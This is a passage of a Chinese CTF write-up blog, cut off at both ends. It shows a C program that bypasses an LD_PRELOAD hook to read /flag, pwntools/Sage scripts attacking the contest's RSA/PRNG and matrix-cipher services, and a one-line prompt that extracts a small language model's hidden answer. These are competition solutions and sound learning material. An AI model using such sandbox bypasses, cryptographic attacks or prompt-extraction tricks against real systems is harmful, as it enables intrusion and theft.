class=\"number\">77</span>, <span class=\"number\">27</span>, <span class=\"number\">60</span>, <span class=\"number\">3</span>, <span class=\"number\">118</span>, <span class=\"number\">24</span>, <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">61</span>,</span><br><span class=\"line\">                         <span class=\"number\">25</span>, <span class=\"number\">63</span>, <span class=\"number\">77</span>, <span class=\"number\">36</span>, <span class=\"number\">5</span>, <span class=\"number\">32</span>, <span class=\"number\">60</span>, <span class=\"number\">67</span>, <span class=\"number\">113</span>, <span class=\"number\">28</span>])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    check_equals(flag.index(<span class=\"string\">&#x27;flag&#123;&#x27;</span>), <span class=\"number\">0</span>)</span><br><span class=\"line\">    check_equals(flag.index(<span class=\"string\">&#x27;&#125;&#x27;</span>), <span class=\"built_in\">len</span>(flag) - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"comment\"># print th flag</span></span><br><span class=\"line\">    <span class=\"comment\"># print(flag)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"高频率星球\"><a href=\"#高频率星球\" class=\"headerlink\" title=\"高频率星球\"></a>高频率星球</h2><p>发现原来不装 asciinema 也能玩，一点点用 Ctrl + H 把 ANSI 转义字符删掉就行了。</p>\n<h2 id=\"小型大语言模型星球\"><a href=\"#小型大语言模型星球\" class=\"headerlink\" title=\"小型大语言模型星球\"></a>小型大语言模型星球</h2><p>第一问直接问 <code>Am I smart?</code> 就能套出话来了。<br>第二问已经重装系统了，本地模型都跑不起来，就懒得爆了。</p>\n<h2 id=\"低带宽星球\"><a href=\"#低带宽星球\" class=\"headerlink\" title=\"低带宽星球\"></a>低带宽星球</h2><p>第一问随便压缩一下就行。<br>第二问应该是要手造了，懒得造了。</p>\n<h2 id=\"为什么要打开-flag-😡\"><a href=\"#为什么要打开-flag-😡\" class=\"headerlink\" title=\"为什么要打开 /flag 😡\"></a>为什么要打开 /flag 😡</h2><p>第一问还是 GPT 给出的：</p>\n<blockquote>\n<p>绕过 LD_PRELOAD 注入的共享对象可以比较困难，因为这是一种强大的机制，它允许开发者或系统管理员在运行时更改动态链接的行为。在安全相关的场景或者 Capture The Flag (CTF) 类型的比赛中，绕过这样的限制通常需要一些创造性的方法和对系统工作方式的深刻理解。<br>在给定的上下文中，LD_PRELOAD 用于注入一个共享库（lib.so），这个共享库通过各种方法拦截和更改了文件操作、执行新程序的系统调用。以下是一些可能的绕过策略：<br>    1. 使用静态链接的二进制：<br>    如果可行的话，使用一个静态链接的二进制文件可以避免 LD_PRELOAD 的影响，因为静态链接的程序不会使用动态链接库。<br>    …</p>\n</blockquote>\n<p>想静态编译的话在编译的时候加个 <code>-static</code> 就行了。程序也是 GPT 写的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    FILE *file;</span><br><span class=\"line\">    <span class=\"type\">char</span> *line = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> len = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">ssize_t</span> read;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打开 /flag 文件</span></span><br><span class=\"line\">    file = fopen(<span class=\"string\">&quot;/flag&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;无法打开文件 /flag&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 读取并打印 /flag 文件的内容</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((read = getline(&amp;line, &amp;len, file)) != <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, line);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 释放资源并关闭文件</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(line);</span><br><span class=\"line\">    fclose(file);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> EXIT_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"黑客马拉松\"><a href=\"#黑客马拉松\" class=\"headerlink\" title=\"黑客马拉松\"></a>黑客马拉松</h2><p>做的时候就感觉铁定非预期了，但是令人迷惑的是这才是最自然的思路，那非预期是不是算预期呢（）。<br>说起来还是第二问给我的解题思路，看第一问看了半天发现第二问更简单，分数也是第二问更低，说明出题人是知道的，这样的题目顺序真是居心叵测。<br>第二问直接取 $e = -1 \\mod \\varphi(N)$ 就过了。<br>第一问严格点，还是这么取的话会触发 small loop，因为 $(-1)^2=1$ 嘛，所以取 $e = -3 \\mod \\varphi(N)$ 就行了。<br>两问都是二元 coppersmith 的形式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;202.38.93.111&#x27;</span>, <span class=\"number\">20230</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">small_roots</span>(<span class=\"params\">f, bounds, m=<span class=\"number\">1</span>, d=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> d:</span><br><span class=\"line\">        d = f.degree()</span><br><span class=\"line\"> </span><br><span class=\"line\">    R = f.base_ring()</span><br><span class=\"line\">    N = R.cardinality()</span><br><span class=\"line\">    </span><br><span class=\"line\">    f /= f.coefficients().pop(<span class=\"number\">0</span>)</span><br><span class=\"line\">    f = f.change_ring(ZZ)</span><br><span class=\"line\"> </span><br><span class=\"line\">    G = <span class=\"type\">Sequence</span>([], f.parent())</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m+<span class=\"number\">1</span>):</span><br><span class=\"line\">        base = N**(m-i) * f**i</span><br><span class=\"line\">        <span class=\"keyword\">for</span> shifts <span class=\"keyword\">in</span> itertools.product(<span class=\"built_in\">range</span>(d), repeat=f.nvariables()):</span><br><span class=\"line\">            g = base * prod(<span class=\"built_in\">map</span>(power, f.variables(), shifts))</span><br><span class=\"line\">            G.append(g)</span><br><span class=\"line\"> </span><br><span class=\"line\">    B, monomials = G.coefficient_matrix()</span><br><span class=\"line\">    monomials = vector(monomials)</span><br><span class=\"line\"> </span><br><span class=\"line\">    factors = [monomial(*bounds) <span class=\"keyword\">for</span> monomial <span class=\"keyword\">in</span> monomials]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, factor <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(factors):</span><br><span class=\"line\">        B.rescale_col(i, factor)</span><br><span class=\"line\"> </span><br><span class=\"line\">    B = B.dense_matrix().LLL()</span><br><span class=\"line\"> </span><br><span class=\"line\">    B = B.change_ring(QQ)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, factor <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(factors):</span><br><span class=\"line\">        B.rescale_col(i, <span class=\"number\">1</span>/factor)</span><br><span class=\"line\"> </span><br><span class=\"line\">    H = <span class=\"type\">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">filter</span>(<span class=\"literal\">None</span>, B*monomials):</span><br><span class=\"line\">        H.append(h)</span><br><span class=\"line\">        I = H.ideal()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> I.dimension() == -<span class=\"number\">1</span>:</span><br><span class=\"line\">            H.pop()</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> I.dimension() == <span class=\"number\">0</span>:</span><br><span class=\"line\">            roots = []</span><br><span class=\"line\">            <span class=\"keyword\">for</span> root <span class=\"keyword\">in</span> I.variety(ring=ZZ):</span><br><span class=\"line\">                root = <span class=\"built_in\">tuple</span>(R(root[var]) <span class=\"keyword\">for</span> var <span class=\"keyword\">in</span> f.variables())</span><br><span class=\"line\">                roots.append(root)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> roots</span><br><span class=\"line\">    <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">20888518302262822708640092467070098180239940282964311580846713529915991035084176547285976560408772270176488335531054066899663135571600859126844374032782889</span></span><br><span class=\"line\">lfp = <span class=\"number\">641940332996671520364775722844731269161</span></span><br><span class=\"line\">q = <span class=\"number\">6214251232316644767865593529639904703813556510242875683726437167720285962376267466666131377504429682587986680767643437843442269652671382746406944152412577</span></span><br><span class=\"line\">lfq = <span class=\"number\">381239571907162860348261198437277761621</span></span><br><span class=\"line\"></span><br><span class=\"line\">phi = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">e = phi - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">token = &lt;token&gt;</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Please input your token:&#x27;</span>, token.encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;p:&#x27;</span>, <span class=\"built_in\">str</span>(p).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;q:&#x27;</span>, <span class=\"built_in\">str</span>(q).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;A large prime factor of p-1: &#x27;</span>, <span class=\"built_in\">str</span>(lfp).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;A large prime factor of q-1: &#x27;</span>, <span class=\"built_in\">str</span>(lfq).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;e:&#x27;</span>, <span class=\"built_in\">str</span>(e).encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Choose mission: &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">bl = <span class=\"built_in\">eval</span>(r.recvline().decode().strip())[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">n = p*q</span><br><span class=\"line\">PR = PolynomialRing(Zmod(n), names=(<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;bh&#x27;</span>))</span><br><span class=\"line\">(a, bh) = PR._first_ngens(<span class=\"number\">2</span>)</span><br><span class=\"line\">f = a * (bh * <span class=\"number\">2</span>**<span class=\"number\">928</span> + bl) - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">sol = small_roots(f, [<span class=\"number\">2</span>**<span class=\"number\">96</span>, <span class=\"number\">2</span>**<span class=\"number\">96</span>], d=<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">_, bh = sol[<span class=\"number\">0</span>]</span><br><span class=\"line\">b = (bh * <span class=\"number\">2</span>**<span class=\"number\">928</span> + bl) % n</span><br><span class=\"line\"><span class=\"built_in\">print</span>(b)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Predict PRNG state: &#x27;</span>, <span class=\"built_in\">str</span>(b).encode())</span><br><span class=\"line\">flag = r.recvline().decode().strip()</span><br><span class=\"line\">success(flag)</span><br><span class=\"line\">r.close()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"不可加密的异世界-2\"><a href=\"#不可加密的异世界-2\" class=\"headerlink\" title=\"不可加密的异世界 2\"></a>不可加密的异世界 2</h2><p>关键就是在 GF(257) 里运算后结果还模了 256，所以有一些 256 变成了 0 返回。那么我们看到的 0 就不知道它原来是 0 还是 256 了。<br>观察字符的规律，可以发现 ascii 码的最高位一定为 0，那么就可以用异或制造相差 128 的两轮差分，这时候能还原矩阵的大部分，少部分没还原是因为上面的原因。<br>这时候如果拿到的向量含 0，就可以用次高位来继续拿一组进行修复，因为我们拿到了向量的大部分，所以可以分别假设次高位为 0 和 1，然后和已知向量进行比较，最像的那个就是正确的。<br>这时候基本有一半左右概率还原了，我们可以算一下概率，上面方法出错的可能只会是因为三组向量中有两个 0 同时出现在一个位置或者三 0 合一（极品情况）。对任一元素，三次都不是 0 或者只出一次 0 的概率为 $(\\frac{255}{256})^3 + 3 \\times \\frac{1}{256} \\times (\\frac{255}{256})^2 = \\frac{8388225}{8388608}$，即出现问题的概率为 $\\frac{383}{8388608}$，然而即使出了问题，我们也有一半的概率直接猜对（默认猜 0 原本就是 0），所以单个元素出错概率为 $\\frac{383}{16777216}$，正确概率为 $\\frac{16776833}{16777216}$，那么 128*128=16384 个元素全部正确的概率为 $(\\frac{16776833}{16777216})^{16384}\\approx 0.687957850470333$。<br>当然如果觉得还不够爽可以像我一样再抽一发修正，这样基本很接近 100% 了。<br>第二问直接求个特征向量，第三问再套个 CVP，此时维数比较大，LLL 的结果不够理想，需要用 BKZ。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> sage.<span class=\"built_in\">all</span> <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;202.38.93.111&#x27;</span>, <span class=\"number\">22000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">token = &lt;token&gt;</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;Please input your token:&#x27;</span>, token.encode())</span><br><span class=\"line\"></span><br><span class=\"line\">times = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enc</span>(<span class=\"params\">m</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> times</span><br><span class=\"line\">    times += <span class=\"number\">1</span></span><br><span class=\"line\">    r.sendlineafter(<span class=\"string\">b&#x27;&gt;&#x27;</span>, m.encode())</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;you ciphertext : &#x27;</span>)</span><br><span class=\"line\">    cipher = r.readline().decode().strip()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getvec</span>(<span class=\"params\">i, num=<span class=\"string\">&#x27;00&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;11&#x27;</span>*i + num + <span class=\"string\">&#x27;11&#x27;</span>*(<span class=\"number\">128</span>-i-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getzero</span>(<span class=\"params\">vec</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>) <span class=\"keyword\">if</span> vec[i] == <span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bit_recover</span>(<span class=\"params\">b1, b2, diff</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (b1 - b2)*<span class=\"built_in\">pow</span>(diff, -<span class=\"number\">1</span>, <span class=\"number\">257</span>) % <span class=\"number\">257</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">vec_recover</span>(<span class=\"params\">v1, v2, diff</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [bit_recover(b1, b2, diff) <span class=\"keyword\">for</span> b1, b2 <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(v1, v2)]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">diff_attack</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    <span class=\"comment\"># suppose xorflag = &#x27;00000000&#x27;</span></span><br><span class=\"line\">    xorflag = <span class=\"number\">0</span></span><br><span class=\"line\">    c00 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;00&#x27;</span>)))</span><br><span class=\"line\">    c80 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;80&#x27;</span>)))</span><br><span class=\"line\">    most = vec_recover(c80, c00, <span class=\"number\">0x80</span>)</span><br><span class=\"line\">    zero00 = getzero(c00)</span><br><span class=\"line\">    zero80 = getzero(c80)</span><br><span class=\"line\">    <span class=\"comment\"># if no zero in c00 and c80, then most is correct</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(zero00+zero80) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> most</span><br><span class=\"line\">    zero0080 = <span class=\"built_in\">list</span>(<span class=\"built_in\">set</span>(zero00) &amp; <span class=\"built_in\">set</span>(zero80))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero0080:</span><br><span class=\"line\">        <span class=\"comment\"># remove the zero in zero00 and zero80, they will be patched later</span></span><br><span class=\"line\">        zero00.remove(i)</span><br><span class=\"line\">        zero80.remove(i)</span><br><span class=\"line\">    c40 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;40&#x27;</span>)))</span><br><span class=\"line\">    zero40 = getzero(c40)</span><br><span class=\"line\">    k40 = vec_recover(c40, c00, -<span class=\"number\">0x40</span>)</span><br><span class=\"line\">    k41 = vec_recover(c40, c00, <span class=\"number\">0x40</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k40))) &lt; <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k41))):</span><br><span class=\"line\">        xorflag ^= <span class=\"number\">0x40</span></span><br><span class=\"line\">    zero0040 = []</span><br><span class=\"line\">    zero4080 = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero00:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> zero40:</span><br><span class=\"line\">            zero0040.append(i)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        most[i] = bit_recover(c80[i], c40[i], (xorflag^<span class=\"number\">0x80</span>)-(xorflag^<span class=\"number\">0x40</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero80:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> zero40:</span><br><span class=\"line\">            zero4080.append(i)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        most[i] = bit_recover(c40[i], c00[i], (xorflag^<span class=\"number\">0x40</span>)-xorflag)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(zero0040+zero4080+zero0080) == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> most</span><br><span class=\"line\">    c20 = <span class=\"built_in\">bytes</span>.fromhex(enc(getvec(idx, <span class=\"string\">&#x27;20&#x27;</span>)))</span><br><span class=\"line\">    k20 = vec_recover(c20, c00, <span class=\"number\">0x20</span>)</span><br><span class=\"line\">    k21 = vec_recover(c20, c00, -<span class=\"number\">0x20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k20))) &gt; <span class=\"built_in\">abs</span>(norm(vector(ZZ, most)-vector(ZZ, k21))):</span><br><span class=\"line\">        xorflag ^= <span class=\"number\">0x20</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero0040:</span><br><span class=\"line\">        most[i] = bit_recover(c80[i], c20[i], (xorflag^<span class=\"number\">0x80</span>)-(xorflag^<span class=\"number\">0x20</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero4080:</span><br><span class=\"line\">        most[i] = bit_recover(c20[i], c00[i], (xorflag^<span class=\"number\">0x20</span>)-xorflag)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zero0080:</span><br><span class=\"line\">        most[i] = bit_recover(c40[i], c20[i], (xorflag^<span class=\"number\">0x40</span>)-(xorflag^<span class=\"number\">0x20</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> most</span><br><span class=\"line\">    </span><br><span class=\"line\">m = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(<span class=\"number\">128</span>)):</span><br><span class=\"line\">    m.append(diff_attack(i))</span><br><span class=\"line\">success(<span class=\"string\">&#x27;recover key in &#123;&#125; times&#x27;</span>.<span class=\"built_in\">format</span>(times))</span><br><span class=\"line\"></span><br><span class=\"line\">c = <span class=\"built_in\">bytes</span>.fromhex(enc(<span class=\"string\">&#x27;0&#x27;</span>*<span class=\"number\">255</span>+<span class=\"string\">&#x27;1&#x27;</span>))</span><br><span class=\"line\">M = matrix(GF(<span class=\"number\">257</span>), m).transpose()</span><br><span class=\"line\">result = (M**(-<span class=\"number\">1</span>)) * vector(GF(<span class=\"number\">257</span>), <span 